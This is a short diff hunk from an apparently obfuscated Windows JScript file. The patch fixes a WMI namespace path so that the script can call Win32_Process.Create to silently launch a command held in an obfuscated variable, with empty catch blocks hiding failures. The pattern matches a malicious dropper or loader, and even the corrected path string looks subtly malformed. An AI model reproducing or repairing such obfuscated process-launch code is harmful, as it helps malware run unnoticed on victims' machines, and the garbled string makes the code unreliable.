@@ -200,7 +200,7 @@ try {
     }
     catch (e) {}
     try {
-        var vkxvlqbn570 = GetObject("winmgmts:{impersonationLevel=impersonate}!\.ootcimv2");
+        var vkxvlqbn570 = GetObject("winmgmts:{impersonationLevel=impersonate}!\.rootcimv2");
         var vkxvlqbn72 = vkxvlqbn570.Get("Win32_Process").Create(RJhwrtVRl790, null, null, 0);
         if (vkxvlqbn72 !== 0) {
             vkxvlqbn354;
